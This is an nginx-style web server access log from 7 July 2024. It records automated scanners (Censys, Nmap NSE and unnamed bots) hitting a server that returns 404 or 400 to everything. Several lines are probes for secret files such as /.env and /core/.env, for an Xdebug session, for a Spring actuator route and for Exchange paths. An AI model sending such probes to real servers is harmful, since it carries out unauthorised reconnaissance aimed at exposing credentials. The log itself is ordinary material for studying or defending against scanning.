47.90.217.179 - - [07/Jul/2024:01:05:18 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
47.90.217.179 - - [07/Jul/2024:01:07:46 +0000] "test" 400 154 "-" "-"
206.168.34.55 - - [07/Jul/2024:01:09:35 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
206.168.34.55 - - [07/Jul/2024:01:09:47 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.55 - - [07/Jul/2024:01:09:47 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
83.97.73.245 - - [07/Jul/2024:01:38:59 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
13.65.18.180 - - [07/Jul/2024:01:43:32 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
13.65.18.180 - - [07/Jul/2024:01:47:22 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.18.180 - - [07/Jul/2024:01:47:22 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.18.180 - - [07/Jul/2024:01:47:22 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.18.180 - - [07/Jul/2024:01:47:22 +0000] "GET /wsman HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.18.180 - - [07/Jul/2024:01:47:22 +0000] "GET /swagger HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
13.65.18.180 - - [07/Jul/2024:01:47:23 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
188.166.49.135 - - [07/Jul/2024:01:56:35 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
141.98.83.197 - - [07/Jul/2024:02:07:03 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.236.176.3 - - [07/Jul/2024:02:10:53 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
45.148.10.251 - - [07/Jul/2024:02:13:37 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [07/Jul/2024:02:30:20 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:02:30:20 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:02:31:18 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.224.128.43 - - [07/Jul/2024:02:49:11 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.97.73.245 - - [07/Jul/2024:02:49:27 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
199.45.155.100 - - [07/Jul/2024:03:09:53 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
199.45.155.100 - - [07/Jul/2024:03:10:03 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.100 - - [07/Jul/2024:03:10:05 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
91.92.247.56 - - [07/Jul/2024:03:22:05 +0000] "GET /core/.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [07/Jul/2024:03:47:26 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
45.79.181.104 - - [07/Jul/2024:03:49:23 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x02\x9F\x96R\x8C\x9C\xCD\x89\xA97\x9B\x01\x9BXN\x0FLy=\x224\xD9\xDER\x22N\xCA\xF4\xD2\x95^h\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.255.210.33 - - [07/Jul/2024:04:05:56 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:04:26:10 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [07/Jul/2024:04:26:11 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
